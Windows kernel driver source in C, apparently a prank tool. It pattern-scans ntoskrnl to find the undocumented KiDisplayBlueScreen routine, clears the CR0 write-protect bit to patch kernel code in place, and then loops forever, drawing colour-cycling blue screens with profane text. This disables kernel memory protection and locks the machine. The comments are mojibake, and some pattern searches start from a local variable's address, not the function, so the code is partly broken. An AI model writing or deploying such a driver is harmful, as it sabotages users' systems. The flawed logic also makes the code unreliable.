#include <ntifs.h>
#include <minwindef.h>

#define CSoD_POOL_TAG 'DoSC'

#define BV_COLOR_BLACK          0
#define BV_COLOR_RED            1
#define BV_COLOR_GREEN          2
#define BV_COLOR_BROWN          3
#define BV_COLOR_BLUE           4
#define BV_COLOR_MAGENTA        5
#define BV_COLOR_CYAN           6
#define BV_COLOR_DARK_GRAY      7
#define BV_COLOR_LIGHT_GRAY     8
#define BV_COLOR_LIGHT_RED      9
#define BV_COLOR_LIGHT_GREEN    10
#define BV_COLOR_YELLOW         11
#define BV_COLOR_LIGHT_BLUE     12
#define BV_COLOR_LIGHT_MAGENTA  13
#define BV_COLOR_LIGHT_CYAN     14
#define BV_COLOR_WHITE          15
#define BV_COLOR_NONE           16
#define BV_MAX_COLORS           16

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,                 //  0 Y N
	SystemProcessorInformation,             //  1 Y N
	SystemPerformanceInformation,           //  2 Y N
	SystemTimeOfDayInformation,             //  3 Y N
	SystemNotImplemented1,                  //  4 Y N
	SystemProcessesAndThreadsInformation,   //  5 Y N
	SystemCallCounts,                       //  6 Y N
	SystemConfigurationInformation,         //  7 Y N
	SystemProcessorTimes,                   //  8 Y N
	SystemGlobalFlag,                       //  9 Y Y
	SystemNotImplemented2,                  // 10 Y N
	SystemModuleInformation,                // 11 Y N
	SystemLockInformation,                  // 12 Y N
	SystemNotImplemented3,                  // 13 Y N
	SystemNotImplemented4,                  // 14 Y N
	SystemNotImplemented5,                  // 15 Y N
	SystemHandleInformation,                // 16 Y N
	SystemObjectInformation,                // 17 Y N
	SystemPagefileInformation,              // 18 Y N
	SystemInstructionEmulationCounts,       // 19 Y N
	SystemInvalidInfoClass1,                // 20
	SystemCacheInformation,                 // 21 Y Y
	SystemPoolTagInformation,               // 22 Y N
	SystemProcessorStatistics,              // 23 Y N
	SystemDpcInformation,                   // 24 Y Y
	SystemNotImplemented6,                  // 25 Y N
	SystemLoadImage,                        // 26 N Y
	SystemUnloadImage,                      // 27 N Y
	SystemTimeAdjustment,                   // 28 Y Y
	SystemNotImplemented7,                  // 29 Y N
	SystemNotImplemented8,                  // 30 Y N
	SystemNotImplemented9,                  // 31 Y N
	SystemCrashDumpInformation,             // 32 Y N
	SystemExceptionInformation,             // 33 Y N
	SystemCrashDumpStateInformation,        // 34 Y Y/N
	SystemKernelDebuggerInformation,        // 35 Y N
	SystemContextSwitchInformation,         // 36 Y N
	SystemRegistryQuotaInformation,         // 37 Y Y
	SystemLoadAndCallImage,                 // 38 N Y
	SystemPrioritySeparation,               // 39 N Y
	SystemNotImplemented10,                 // 40 Y N
	SystemNotImplemented11,                 // 41 Y N
	SystemInvalidInfoClass2,                // 42
	SystemInvalidInfoClass3,                // 43
	SystemTimeZoneInformation,              // 44 Y N
	SystemLookasideInformation,             // 45 Y N
	SystemSetTimeSlipEvent,                 // 46 N Y
	SystemCreateSession,                    // 47 N Y
	SystemDeleteSession,                    // 48 N Y
	SystemInvalidInfoClass4,                // 49
	SystemRangeStartInformation,            // 50 Y N
	SystemVerifierInformation,              // 51 Y Y
	SystemAddVerifier,                      // 52 N Y
	SystemSessionProcessesInformation       // 53 Y N
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_MODULE_INFORMATION {
	HANDLE Section;
	PVOID MappedBase;
	PVOID Base;
	ULONG Size;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT PathLength;
	CHAR ImageName[256];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef struct _tagSysModuleList {          //ģ�����ṹ
	ULONG ulCount;
	SYSTEM_MODULE_INFORMATION SMI[1];
} MODULES, * PMODULES;

NTSTATUS
ZwQuerySystemInformation(
	IN SYSTEM_INFORMATION_CLASS,
	IN PVOID,
	IN ULONG,
	IN PULONG
);

typedef VOID
(NTAPI* TKiDisplayBlueScreen)(
	IN ULONG 	MessageId,
	IN BOOLEAN 	IsHardError,
	IN PCHAR HardErrCaption 	OPTIONAL,
	IN PCHAR HardErrMessage 	OPTIONAL,
	IN PCHAR 	Message
	);

NTSTATUS
GetKernelModuleInfo(
	OUT PVOID* ppSysModuleBase,
	OUT PULONG pulSize
)
{
	if (!ppSysModuleBase || !pulSize)
		return STATUS_INVALID_PARAMETER;

	NTSTATUS ntStatus = STATUS_UNSUCCESSFUL;

	*ppSysModuleBase = NULL;
	*pulSize = 0;

	ULONG NeededSize = 0;
	ntStatus = ZwQuerySystemInformation(SystemModuleInformation, NULL, 0, &NeededSize);//��˵�������õ�11�Ź��ܣ�ö��һ���ں����Ѽ��ص�ģ�顣 ���ܺ�Ϊ11���Ȼ�ȡ����Ļ�������С
	if (ntStatus == STATUS_INFO_LENGTH_MISMATCH)
	{
		PMODULES pModuleList = (PMODULES)ExAllocatePoolWithTag(PagedPool, NeededSize, CSoD_POOL_TAG);//�����ڴ�
		if (pModuleList)
		{
			ntStatus = ZwQuerySystemInformation(SystemModuleInformation, pModuleList, NeededSize, &NeededSize);
			if (NT_SUCCESS(ntStatus))
			{
				//ntoskrnl.exe���ǵ�һ������
				*ppSysModuleBase = pModuleList->SMI[0].Base;
				*pulSize = pModuleList->SMI[0].Size;
			}
			ExFreePoolWithTag(pModuleList, CSoD_POOL_TAG);
		}
		else
			ntStatus = STATUS_MEMORY_NOT_ALLOCATED;
	}
	else
		ntStatus = STATUS_UNSUCCESSFUL;

	return ntStatus;
}

NTSTATUS
FindCode(
	IN PVOID pSearchBeginAddr,
	IN ULONG ulSearchLength,
	IN PBYTE pSpecialCode,
	IN ULONG ulSpecialCodeLength,
	OUT PVOID* ppFunc
)
{
	if (!pSearchBeginAddr || !ulSearchLength || !ulSpecialCodeLength || !pSpecialCode || !ppFunc)
		return STATUS_INVALID_PARAMETER;

	NTSTATUS ntStatus = STATUS_NOT_FOUND;

	*ppFunc = NULL;

	PBYTE pBeginAddr = (PBYTE)pSearchBeginAddr;
	PBYTE pEndAddr = pBeginAddr + ulSearchLength;

	for (PBYTE i = pBeginAddr; i < pEndAddr; i++)
	{
		ULONG j = 0;
		// ����������
		for (j = 0; j < ulSpecialCodeLength; j++)
		{
			// �жϵ�ַ�Ƿ���Ч  ntoskrnl.exe��ʱ��ַ��Ч����������PAGE FAULED IN NONPAGED AREA
			/*if (!MmIsAddressValid((PVOID)(i + j)))
				break;*/

				// ƥ��������
			if (*(PBYTE)(i + j) != pSpecialCode[j])
				break;
		}
		// ƥ��ɹ�
		if (j >= ulSpecialCodeLength)
		{
			*ppFunc = i;
			ntStatus = STATUS_SUCCESS;
			break;
		}
	}

	return ntStatus;
}

KIRQL
RemoveWP(
	VOID
)
{
	// (PASSIVE_LEVEL)���� IRQL �ȼ�ΪDISPATCH_LEVEL�������ؾɵ� IRQL
	// ��Ҫһ���ߵ�IRQL�����޸�
	KIRQL Irql = KeRaiseIrqlToDpcLevel();
#ifdef _WIN64
	ULONG_PTR cr0 = __readcr0(); // ������������ȡCr0�Ĵ�����ֵ, �൱��: mov eax,  cr0;

	// ����16λ��WPλ����0������д����
	cr0 &= ~0x10000; // ~ ��λȡ��
	_disable(); // ����жϱ��, �൱�� cli ָ��޸� IF��־λ
	__writecr0(cr0); // ��cr0������������д��Cr0�Ĵ����У��൱��: mov cr0, eax
#else
	__asm
	{
		cli
		push eax
		mov eax, cr0
		and eax, 0FFFEFFFFh
		mov cr0, eax
		pop eax
	}
#endif
	return Irql;
}

VOID
RecoverWP(
	IN KIRQL Irql
)
{
#ifdef _WIN64
	ULONG_PTR cr0 = __readcr0();
	cr0 |= 0x10000; // WP��ԭΪ1
	_disable(); // ����жϱ��, �൱�� cli ָ���� IF��־λ
	__writecr0(cr0); // ��cr0������������д��Cr0�Ĵ����У��൱��: mov cr0, eax
#else
	__asm
	{
		push eax
		mov eax, cr0
		or eax, 10000h
		mov cr0, eax
		pop eax
		sti
	}
#endif
	// �ָ�IRQL�ȼ�
	KeLowerIrql(Irql);

	return;
}

NTSTATUS
DriverEntry(
	IN PDRIVER_OBJECT pDriverObject,
	IN PUNICODE_STRING pRegistryPath
)
{
	UNREFERENCED_PARAMETER(pDriverObject);
	UNREFERENCED_PARAMETER(pRegistryPath);

	PVOID pKernelBase = NULL;
	ULONG KernelSize = 0;
	NTSTATUS ntStatus = GetKernelModuleInfo(&pKernelBase, &KernelSize);
	if (NT_SUCCESS(ntStatus))
	{
		TKiDisplayBlueScreen pKiDisplayBlueScreen = NULL;
		PVOID pBack = NULL;
		PVOID pText = NULL;

#ifdef _WIN64
		BYTE ShellCode_pKiDisplayBlueScreen[] = { 0xff,0xf3 ,0x55 ,0x56 ,0x57 ,0x41 ,0x54 ,0x48 ,0x81 ,0xec ,0xc0 ,0x00 ,0x00 ,0x00 };
		BYTE ShellCode_Back[] = { 0xc7, 0x44, 0x24, 0x20, 0x04, 0x00, 0x00, 0x00 ,0xe8 };
		BYTE ShellCode_Text[] = { 0xb9, 0x0f, 0x00, 0x00, 0x00, 0xe8 };
#else
		BYTE ShellCode_pKiDisplayBlueScreen[] = { 0x8b , 0xff , 0x55 , 0x8b , 0xec , 0x83 , 0xec , 0x68 };
		BYTE ShellCode_Back[] = { 0x6a , 0x04 , 0x68 , 0xdf , 0x01 , 0x00 , 0x00 , 0xbf , 0x7f , 0x02 , 0x00 , 0x00 , 0x57 , 0x53 , 0x53 , 0xe8 };
		BYTE ShellCode_Text[] = { 0x6a, 0x0f, 0xe8 };
#endif

		FindCode(pKernelBase, KernelSize, ShellCode_pKiDisplayBlueScreen, sizeof(ShellCode_pKiDisplayBlueScreen), (PVOID*)&pKiDisplayBlueScreen);
		FindCode(&pKiDisplayBlueScreen, 0x200, ShellCode_Back, sizeof(ShellCode_Back), &pBack);
		FindCode(&pKiDisplayBlueScreen, 0x200, ShellCode_Text, sizeof(ShellCode_Text), &pText);

		if (pKiDisplayBlueScreen && pBack && pText)
		{
			KIRQL _Irql = KeRaiseIrqlToDpcLevel();
			while (TRUE)
				for (UCHAR x = 0; x < BV_MAX_COLORS; x++)
					for (UCHAR y = 0; y < BV_MAX_COLORS; y++)
					{
						KIRQL Irql = RemoveWP();
#ifdef _WIN64
						* (PBYTE)((ULONG_PTR)pBack + 4) = x;
#else
						* (PBYTE)((ULONG_PTR)pBack + 1) = x;
#endif

						* (PBYTE)((ULONG_PTR)pText + 1) = y;
						RecoverWP(Irql);
						pKiDisplayBlueScreen(0, TRUE, "FUCK YOU WIN7!!\n", "FUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUCK!", "QWQ");

						KeStallExecutionProcessor(600);
		}
			KeLowerIrql(_Irql);
	}
		else
			ntStatus = STATUS_NOT_FOUND;
}

	return ntStatus;
}